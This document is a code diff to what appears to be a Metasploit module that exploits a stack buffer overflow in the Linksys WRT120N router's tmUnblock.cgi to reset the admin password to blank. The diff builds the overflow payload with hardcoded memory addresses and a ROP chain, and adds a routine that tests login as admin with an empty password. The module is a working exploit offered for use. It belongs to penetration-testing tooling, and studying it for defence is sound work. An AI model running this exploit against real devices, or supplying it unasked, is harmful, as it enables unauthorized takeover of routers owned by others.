@@ -11,7 +11,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'            => 'Linksys WRT120N Buffer Overflow in tmUnblock - Password Reset',
+      'Name'            => 'Linksys WRT120N tmUnblock Buffer Overflow',
       'Description'     => %q{
           This module exploits a buffer overflow vulnerability in the WRT120N Linksys router.
          It is possible to reset the password of the management interface temporarily to an
@@ -25,34 +25,59 @@ class Metasploit3 < Msf::Auxiliary
       'License'         => MSF_LICENSE,
       'References'      =>
         [
-          [ 'EDB', '31758' ]
+          [ 'EDB', '31758' ],
+          [ 'OSVDB', '103521' ],
+          [ 'URL', 'http://www.devttys0.com/2014/02/wrt120n-fprintf-stack-overflow/' ] # a huge amount of details about this vulnerability and the original exploit
         ],
-      'DefaultTarget'  => 0,
       'DisclosureDate' => 'Feb 19 2014'))
+  end
 
-    register_options(
-      [
-        Opt::RPORT(80),
-      ], self.class)
+  def check_login(user,pass)
+    print_status("#{peer} - Trying to login with #{user} and empty password")
+    begin
+      res = send_request_cgi({
+        'uri'     => '/',
+        'method'  => 'GET',
+        'authorization' => basic_auth(user,"")
+      })
+      if res.nil? or res.code == 404
+        print_status("#{peer} - No successful login possible with #{user} and empty password")
+        return false
+      end
+      if [200, 301, 302].include?(res.code)
+        print_good("#{peer} - Successful login #{user} and empty password")
+        return true
+      else
+        print_status("#{peer} - No successful login possible with #{user} and empty password")
+        return false
+      end
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
+    end
   end
 
   def run
+    if (check_login("admin","") == true)
+      print_good("#{peer} - login with user admin and no password possible. There is no need to use this module.")
+      return
+    end
+
     uri = '/cgi-bin/tmUnblock.cgi'
 
-    print_status("#{rhost}:#{rport} - Resetting password for the admin user ...")
+    print_status("#{peer} - Resetting password for the admin user ...")
 
     postdata = Rex::Text.rand_text_alpha(246)             # Filler
-    postdata << "\x81\x54\x4A\xF0"                        # $s0, address of admin password in memory
-    postdata << "\x80\x31\xF6\x34"                        # $ra
+    postdata << [0x81544AF0].pack("N")                    # $s0, address of admin password in memory
+    postdata << [0x8031f634].pack("N")                    # $ra
     postdata << Rex::Text.rand_text_alpha(40)             # Stack filler
     postdata << Rex::Text.rand_text_alpha(4)              # Stack filler
-    postdata << "\x80\x34\x71\xB8"                        # ROP 1 $ra (address of ROP 2)
+    postdata << [0x803471b8].pack("N")                    # ROP 1 $ra (address of ROP 2)
     postdata << Rex::Text.rand_text_alpha(8)              # Stack filler
 
     (0..3).each do |i|
       postdata << Rex::Text.rand_text_alpha(4)            # ROP 2 $s0, don't care
       postdata << Rex::Text.rand_text_alpha(4)            # ROP 2 $s1, don't care
-      postdata << "\x80\x34\x71\xB8"                      # ROP 2 $ra (address of itself)
+      postdata << [0x803471b8].pack("N")                  # ROP 2 $ra (address of itself)
       postdata << Rex::Text.rand_text_alpha(4-(3*(i/3)))  # Stack filler
     end
 
@@ -67,13 +92,17 @@ class Metasploit3 < Msf::Auxiliary
               'TM_Block_URL' => postdata
            }
         })
-      return if res.nil?
-      return if res.code == 404
-      if res.code == 500
-         print_status("Unknown exploiting status - try to login with user admin and without a password")
-      end
+        if res and res.code == 500
+           if (check_login("admin","") == true)
+             print_good("#{peer} - Expected answer and the login was successful. Try to login with the user admin and a blank password")
+           else
+             print_status("#{peer} - Expected answer, but unknown exploiting status. Try to login with the user admin and a blank password")
+           end
+        else
+           print_error("#{peer} - Unexpected answer. Exploiting attempt has failed")
+        end
     rescue ::Rex::ConnectionError
-      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
+      vprint_error("#{peer} - Failed to connect to the web server")
       return
     end
   end
